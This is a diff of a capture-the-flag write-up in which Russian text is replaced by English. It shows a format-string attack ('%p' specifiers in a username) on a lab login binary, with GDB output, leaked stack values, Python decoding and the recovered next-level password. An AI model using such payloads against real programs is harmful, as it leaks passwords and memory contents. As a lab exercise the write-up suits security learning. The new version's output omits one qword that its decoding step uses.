@@ -1,40 +1,42 @@
-После просмотра псевдокода понятно, что открывается файл содержащий пароль
-от следующего уровня и его содержимое сохраняется в поле.
+Level02
 
-Так же у нас есть 2 поля, отвечающие за введенные логин и пароль.
-Сначала в памяти идет поле пароля, потом сразу же выделяется память для введенного логина.
+By using info function we can see that program opens file with password.
 
-Введенный пароль сравнивается с выгруженным из файла,
-при удачном вводе, через printf отображается сообщение и введенное имя пользователя.
-После чего происходит закрытие программы.
+   0x00000000004008a2 <+142>:	mov    %rdx,%rsi
+   0x00000000004008a5 <+145>:	mov    %rax,%rdi
+=> 0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt>
 
-Если же пароль не совпадает, через printf выводится оповещение о неудаче и введенное имя пользователя.
+(gdb) printf "%s %s", $rdx, $rax
+r /home/users/level03/.pass(gdb)
 
-Нам достаточно при вводе пользователя вывести множество значений по указателям, перед ними введя DDDD.
-
-DDDD %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+Additionaly there is an unprotected printf that prints the name of the user.
+This means that if we include %p or %x modifiers we can print anything up on the stack, including the copy of the flag.
+AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 
-В ответ мы получаем:
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p--[ Password:
+*****************************************
+AAAA 0x7fffffffe4a0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe698 0x1f7ff9a08 
+0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 
+0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 
+(nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 does not have access!
 
-DDDD 0x7fffffffe4f0 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08
-0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025
-0x2520702520702520 0x2070252070252070 0x7025207025 (nil) (nil) (nil) (nil) 0x100000000 (nil)
-0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
-(nil) 0x2070252044444444 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
-
-Нам требуется найти значение DDDD в памяти(44444444),
-соседние ячейки памяти будут содержать значение поля с паролем.
-Идем в обратном порядке т.к. биты читаются справа налево.
-
-0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
-
-Эти значения ячеек и есть наш пароль.
-Заходим на сайт http://crypt-online.ru/crypts/text2hex/ и вводим значения в обратном порядке.
-
-Получаем: H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH
-
-Используем https://codebeautify.org/reverse-string для реверса строки
-и получаем флаг для следующего уровня:
-
+Read bytes in reverse and convert them to ascii from hex.
+0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873
+Using python
+>>> "756e505234376848".decode("hex")[::-1]
+'Hh74RPnu'
+>>> "45414a3561733951".decode("hex")[::-1]
+'Q9sa5JAE'
+>>> "377a7143574e6758".decode("hex")[::-1]
+'XgNWCqz7'
+>>> "354a35686e475873".decode("hex")[::-1]
+'sXGnh5J5'
+>>> "48336750664b394d".decode("hex")[::-1]
+'M9KfPg3H'
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
